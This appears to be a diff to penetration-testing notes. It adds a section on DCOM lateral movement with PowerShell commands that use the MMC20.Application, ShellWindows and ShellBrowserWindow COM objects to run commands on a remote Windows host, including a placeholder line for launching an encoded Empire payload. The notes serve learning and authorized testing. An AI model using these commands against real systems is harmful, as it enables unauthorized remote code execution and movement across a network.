@@ -992,6 +992,7 @@ If one of these ports is open, WinRM is configured and you can try entering a re
    WINS Proxy Enabled. . . . . . . . : No
    DNS Suffix Search List. . . . . . : xxx.example.com
                                        example.com
+
 * Interactive PowerShell session:
 
  ::
@@ -1060,9 +1061,57 @@ As per the technet article `Windows Management Instrumentation <https://msdn.mic
 DCOM 
 ^^^^
 
-* MMC20 + Two others Methods (Ask Tanoy/ read) - Enignma
+The below is as per my understanding (I might be wrong), if so, please do correct me. After reading `Lateral Movement Using the MMC20.Application COM Object <https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/>`_ and `Lateral Movement Via DCOM Round 2 <https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/>`_ I believer there are three ways to do lateral movement by using DCOM
 
-  Yet to run
+* DCOM applications via MMC Application Class (MMC20.Application) : This COM object allows you to script components of MMC snap-in operations. there is a method named “ExecuteShellCommand” under Document.ActiveView.
+
+ ::
+
+  PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","IPAddress"))
+  PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)
+
+  For Empire:
+  $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")
+
+* DCOM via ShellExecute
+
+ ::
+
+  $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"IPAddress")
+  $obj = [System.Activator]::CreateInstance($com)
+  $item = $obj.Item()
+  $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
+  ^ The above should run a calc
+
+* DCOM via ShellBrowserWindow ( Windows 10 Only, the object doesn't exists in Windows 7 )
+
+ ::
+
+  $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"IPAddress")
+  $obj = [System.Activator]::CreateInstance($com)
+  $obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
+  ^ The above should run a calc
+
+
+All the above three method, assumes that either you are running the commands as administrator of the remote machine. And you have achieved it either by using runas /netonly or logging in as that user.
+
+
+While executing the above if you get the below error, it means, we do not have access to execute object remotely which results in “Access Denied”:
+
+::
+
+  $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"IPAddress")
+  $obj = [System.Activator]::CreateInstance($com)
+  Exception calling "CreateInstance" with "1" arguement(s) "Retrieving the COM class factory for remote component with CLSID {} from machine IPAddress failed due to the following error 80070005.
+
+  At line:1 char:1
+  + $obj = [System.Activator]::CreateInstance($com)
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    +CategoryInfo             : NotSpecified: (:), MethodInvocationException
+    +FullyQualifiedErrorID    : UnauthorizedAccessException
+
+
+
 
 xfreerdp/ Remote Desktop
 ^^^^^^^^^^^^^^^^^^^^^^^^
